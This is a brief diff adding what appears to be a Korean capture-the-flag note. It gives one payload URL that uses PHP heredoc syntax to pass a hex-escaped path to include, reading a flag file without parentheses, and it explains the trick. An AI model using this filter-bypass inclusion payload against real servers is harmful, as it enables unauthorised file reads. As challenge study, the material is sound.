@@ -1,0 +1,8 @@
+http://s1.r3.ret.sh.cn:32666/?input=include+<<<EOT%0A%5Cx2f%5Cx66%5Cx6c%5Cx61%5Cx67%0AEOT%3Btime
+
+php <<<EOT를 사용해서 하는 heredoc 문법이 있는데
+이건 문자열을 문자열 따옴표 없이 여러 줄로 사용할 수 있도록 허용하는 문법이다.
+
+사실 괄호 없이 LFI를 할 만한 게 include/require 밖에 없어서
+include에 어떻게 문자열을 넣을지가 제일 문제인데
+<<<EOT를 이용한 heredoc 문법을 통해 해결할 수 있다.
